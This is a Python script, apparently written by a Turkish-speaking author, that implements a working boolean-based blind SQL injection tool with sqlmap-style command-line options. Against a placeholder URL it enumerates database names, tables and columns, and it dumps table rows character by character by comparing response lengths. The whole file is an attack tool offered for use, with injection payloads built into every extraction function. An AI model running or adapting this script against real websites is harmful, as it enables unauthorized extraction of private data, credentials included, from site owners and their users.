import argparse
import requests
import sys
class sqli:
    def __init__(self,argsdata):
        self.characters=['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
                   'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                   'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
                   '8', '9',"-","_","?","*","+","?",".",",","%","$","#","="]
        self.database = 0
        self.databaseNameDump=[]
        self.tableNameDump=[]
        self.dumpdata=[]
        self.columnsNameDump=[]
        self.argsdata=argsdata
        if(self.argsdata.dbs):
            self.databaseFalseposition()
            self.databaseNameLength()
        elif(self.argsdata.D and self.argsdata.tables):
            self.databaseFalseposition()
            self.tableCount(self.argsdata.D)
        elif(self.argsdata.D and self.argsdata.T and self.argsdata.columns):
            self.databaseFalseposition()
            self.columnsCOunt(self.argsdata.D , self.argsdata.T)
        elif(self.argsdata.D and self.argsdata.T and self.argsdata.C and self.argsdata.dump):
            self.databaseFalseposition()
            self.dump(self.argsdata.C,self.argsdata.T)
    def databaseFalseposition(self):
        #veritabanı uzunlugunu tespit edelim sayfanın veri döndürmeyen halini girin
        #post data format index.php?id=5&kat=23>to> data={'id':'5','kat':'23'}
        sql=requests.post("http://url.com//",data={'id':'5','kat':'23'})
        self.veridonmeyendurum=len(sql.content.decode('utf-8'))
    def databaseNameLength(self):
        for i in range(100):
            payload1 = f"AND (SELECT LENGTH(database()))>{i}"
            self.injectfunc(payload1)
            if(len(self.sql1.content.decode('utf-8'))==self.veridonmeyendurum):
                break
            else:
                self.database=self.database+1
        print("[+]Database name length: ",self.database)
        self.databaseName()
    def databaseName(self):
        for i in range(1,self.database+1):
            for x in self.characters:
                payload2=f"AND (SELECT ASCII(SUBSTRING(database(), {i}, 1)))='{ord(x)}'"
                self.injectfunc(payload2)
                if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                    pass
                else:
                    self.databaseNameDump.append(x)
                    break
        print("[+]Database name: "+''.join(self.databaseNameDump))
        self.sql1.close()
    def tableCount(self,databasename):
        self.databasename=databasename
        for self.i in range(100):
            payload3 = f"AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{self.databasename}')={self.i}"
            self.injectfunc(payload3)
            if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                    pass
            else:
                print('[+]Database number of tables:',self.i )
                break
        self.gettinTableName(self.i)
    def gettinTableName(self,numberOfTables):
        self.numberOfTables=numberOfTables
        for self.i in range(self.numberOfTables):
            for x in range(50):
                payload4 = f"AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='{self.databasename}' LIMIT {self.i},1)={x}"
                self.injectfunc(payload4)
                if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                    pass
                else:
                    #print("[+]Table name length",x)
                    for k in range(x+1):
                        for y in self.characters:
                            payload5 = f"AND ascii(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{self.databasename}' LIMIT {self.i},1),{k},1))='{ord(y)}'"
                            self.injectfunc(payload5)
                            if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                                pass
                            else:
                                self.tableNameDump.append(y)
                                break
            print(f"[+]{(self.i)+1}-Table name: "+''.join(self.tableNameDump))
            self.tableNameDump.clear()
        self.sql1.close()
    def columnsCOunt(self,databasename,tablename):
        #Kaç kolon var ?
        self.databasename=databasename
        self.tablename=tablename
        for self.i in range(100):
            payload6=f"AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{self.databasename}' AND table_name='{self.tablename}')={self.i}"
            self.injectfunc(payload6)
            if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                pass
            else:
                print(f"[+]{self.tablename} >> {self.i} Columns")
                break
        self.columnsNameLength(self.i)
    def columnsNameLength(self,count):
        self.count=count#kolon sayısı
        for self.r in range(self.count):
            for self.m in range(32):
                payload7=f"AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema='{self.databasename}' AND table_name='{self.tablename}' LIMIT {self.r},1)={self.m}"
                self.injectfunc(payload7)
                if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                    pass
                else:
                    print(f"[+]{(self.r)+1}-Column length >> {self.m}")
                    for self.p in range(1,self.m+1):
                        for i in self.characters:
                            payload8=f"AND ascii(substring((select column_name from information_schema.columns WHERE table_schema='{self.databasename}' AND table_name = '{self.tablename}' limit {self.r},1),{self.p},1)) = '{ord(i)}'"
                            self.injectfunc(payload8)
                            if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                                pass
                            else:
                                self.columnsNameDump.append(i)
                                break
                    print(f"[+]{(self.r)+1}-Columns name: "+''.join(self.columnsNameDump))
                    self.columnsNameDump.clear()
        self.sql1.close()
    def dump(self,columnname,tablename):
        self.tablename=tablename
        self.columnname=columnname
        self.datacount=0
        #burda 40 sonuç ile sınırlandırdım , sonsuz döngü ile hepsi bulunabilir
        for self.i in range(40):
            payload9=f"AND (SELECT LENGTH({self.columnname}) FROM {self.tablename} LIMIT 1)>{self.i}"
            self.injectfunc(payload9)
            if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                break
            else:
                pass
        print(f"{self.columnname} lengt  {self.i}")
        for p in range(10):
            for k in range(1,self.i+1):
                for veri in self.characters:
                    payload8=f"and ascii(substring((Select {self.columnname} from {self.tablename} limit {p},1),{k},1))='{ord(veri)}'"
                    self.injectfunc(payload8)
                    if (len(self.sql1.content.decode('utf-8')) == self.veridonmeyendurum):
                        pass
                    else:
                        self.dumpdata.append(veri)
                        print(veri)
                        break
            print(f"[+] {self.columnname} >> {p+1} >> "+''.join(self.dumpdata))
            self.dumpdata.clear()
        self.sql1.close()
    def injectfunc(self,payload):
        try:
            self.payload=payload
            #post data formatı index.php?id=5&kat=23&all=true >> data={'id':'5','kat':'23','all':'true'}
            #zaafiyetli parametre hangisi ise +self.payload yazmayı unutmayın, örnek >> data={'id':'5','kat':'23'+self.payload,'all':'true'}
            self.sql1 = requests.post("http://url.com/",
                                data={'id': '5', 'kat': '23'+self.payload, 'all': 'true'})
            return self.sql1
        except KeyboardInterrupt:
            print("[*] ending")
            sys.exit(1)
        except requests.exceptions.MissingSchema:
            print("[!]Url format: https://url.yy/")
            sys.exit(1)
        except:
            print("[-]Error.Check connection.")
            sys.exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage="")
    parser.add_argument("--dbs", help="Enumerate DBMS databases",action='store_true')
    parser.add_argument("-D", help="DBMS database to enumerate")
    parser.add_argument("--tables", help="Enumerate DBMS database tables",action='store_true')
    parser.add_argument("-T", help="DBMS database table(s) to enumerate")
    parser.add_argument("--columns", help="Enumerate DBMS database table columns",action='store_true')
    parser.add_argument("-C", help="Enumerate DBMS database table columns")
    parser.add_argument("--dump", help="Dump DBMS database table entries",action='store_true')
    veri = parser.parse_args()
    a=sqli(veri)